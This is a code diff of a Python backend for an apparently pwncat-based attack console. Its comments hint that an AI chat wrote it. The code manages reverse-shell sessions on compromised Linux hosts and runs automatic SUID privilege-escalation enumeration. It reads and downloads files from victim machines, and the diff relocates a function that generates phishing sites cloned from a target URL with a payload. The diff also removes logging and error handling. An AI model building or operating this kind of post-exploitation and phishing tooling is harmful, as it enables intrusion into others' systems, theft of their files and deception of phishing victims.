@@ -25,7 +25,6 @@ log = logging.getLogger("pwncat")
 # --- Persistence ---
 SCRIPTS_FILE = "chorus_scripts.json"
 
-
 def _load_scripts_from_disk():
     global scripts
     with scripts_lock:
@@ -33,22 +32,15 @@ def _load_scripts_from_disk():
             try:
                 with open(SCRIPTS_FILE, "r") as f:
                     scripts = json.load(f)
-                    log.info(f"Loaded {len(scripts)} scripts from {SCRIPTS_FILE}")
             except Exception as e:
-                log.error(f"Error loading scripts from disk: {e}")
                 scripts = {}
         else:
             scripts = {}
 
-
 def _save_scripts_to_disk():
     with scripts_lock:
-        try:
-            with open(SCRIPTS_FILE, "w") as f:
-                json.dump(scripts, f, indent=4)
-        except Exception as e:
-            log.error(f"Error saving scripts to disk: {e}")
-
+        with open(SCRIPTS_FILE, "w") as f:
+            json.dump(scripts, f, indent=4)
 
 # --- Helper Functions ---
 def parse_ls_output(output: str):
@@ -72,9 +64,9 @@ def parse_ls_output(output: str):
             items.append({"name": name, "path": name, "is_dir": details['type'] == 'd'})
     return items
 
-
 # --- Session Management Classes ---
 class PwncatSession:
+    # ... (PwncatSession class remains unchanged from the previous turn)
     def __init__(self, session_id, client_address):
         self.id = session_id
         self.platform = "linux"
@@ -101,7 +93,6 @@ class PwncatSession:
     def enumeration_loop(self):
         time.sleep(5)
         while not self.ssig.has_terminate():
-            # Find SUID binaries
             output = self.execute_utility_command("find / -perm -u=s -type f 2>/dev/null")
             if output:
                 for line in output.strip().splitlines():
@@ -162,13 +153,13 @@ class PwncatSession:
 
 
 class SessionIO(pwncat.IO):
+    # ... (SessionIO class remains unchanged)
     def __init__(self, ssig):
         super(SessionIO, self).__init__(ssig)
         self.active_session = None
 
     def producer(self, *args, **kwargs):
         yield from ()
-
     def consumer(self, data):
         global next_session_id
         if self.active_session is None:
@@ -180,7 +171,6 @@ class SessionIO(pwncat.IO):
                 sessions[session_id] = self.active_session
                 next_session_id += 1
         self.active_session.send_interactive_command(data)
-
     def interrupt(self):
         if self.active_session: self.active_session.ssig.raise_terminate()
 
@@ -190,6 +180,13 @@ def initialize_manager():
     logging.getLogger("pwncat").setLevel(logging.CRITICAL)
     _load_scripts_from_disk()
 
+
+def generate_phishing_site(target_url: str, payload: str):
+    output_dir = f"./phish_kits/{urlparse(target_url).netloc}"
+    return makephish.generate_phishing_site(target_url, payload, output_dir)
+
+
+# ... (All other API functions remain the same)
 def create_listener(uri: str):
     global next_listener_id
     try:
@@ -218,7 +215,6 @@ def create_listener(uri: str):
     except Exception as e:
         return {"error": str(e)}
 
-
 def list_files(session_id: int, path: str):
     with sessions_lock:
         if session_id in sessions:
@@ -231,14 +227,12 @@ def list_files(session_id: int, path: str):
                 return items
     return []
 
-
 def read_file(session_id: int, path: str):
     with sessions_lock:
         if session_id in sessions:
             content = sessions[session_id].execute_utility_command(f"cat \"{path}\"")
             return {"content": content} if content is not None else {"error": "Failed to read file"}
     return {"error": "Session not found"}
-
 
 def download_file(session_id: int, remote_path: str, local_path: str):
     with sessions_lock:
@@ -255,14 +249,6 @@ def download_file(session_id: int, remote_path: str, local_path: str):
             return {"error": f"Failed to write file: {e}"}
     return {"error": f"Failed to read remote file"}
 
-
-def generate_phishing_site(target_url: str, payload: str):
-    # This path is relative to the Chaquopy python root
-    output_dir = f"./phish_kits/{urlparse(target_url).netloc}"
-    return makephish.generate_phishing_site(target_url, payload, output_dir)
-
-
-# ... all other API functions ...
 def get_listeners(): return [{"id": l["id"], "uri": l["uri"]} for l in listeners.values()]
 def remove_listener(listener_id: int):
     if listener_id in listeners:
